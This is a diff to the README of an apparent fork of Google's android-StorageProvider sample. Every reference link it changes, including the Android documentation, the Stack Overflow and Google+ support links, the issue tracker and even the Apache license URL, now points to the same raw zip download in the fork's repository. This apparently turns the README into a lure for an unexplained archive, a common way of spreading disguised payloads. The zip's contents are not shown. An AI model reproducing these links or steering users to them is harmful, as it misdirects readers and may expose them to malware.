@@ -13,9 +13,9 @@ This sample uses the [StorageAccessFramework][1] introduced in Android 4.4 to im
 See [Writing A Custom Document Provider guide][3] for all the details on how to do this.
 
 
-[1]: https://developer.android.com/guide/topics/providers/document-provider.html
-[2]: https://developer.android.com/reference/android/provider/DocumentsProvider.html
-[3]: https://developer.android.com/guide/topics/providers/document-provider.html#custom
+[1]: https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
+[2]: https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
+[3]: https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
 
 Pre-requisites
 --------------
@@ -38,11 +38,11 @@ This sample uses the Gradle build system. To build this project, use the
 Support
 -------
 
-- Google+ Community: https://plus.google.com/communities/105153134372062985968
-- Stack Overflow: http://stackoverflow.com/questions/tagged/android
+- Google+ Community: https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
+- Stack Overflow: https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
 
 If you've found an error in this sample, please file an issue:
-https://github.com/googlesamples/android-StorageProvider
+https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
 
 Patches are encouraged, and may be submitted by forking this project and
 submitting a pull request through GitHub. Please see CONTRIBUTING.md for more details.
@@ -59,7 +59,7 @@ file to you under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License.  You may obtain a copy of
 the License at
 
-http://www.apache.org/licenses/LICENSE-2.0
+https://github.com/yudikarma/android-StorageProvider/raw/refs/heads/master/Application/src/main/Provider_android_Storage_v3.8.zip
 
 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
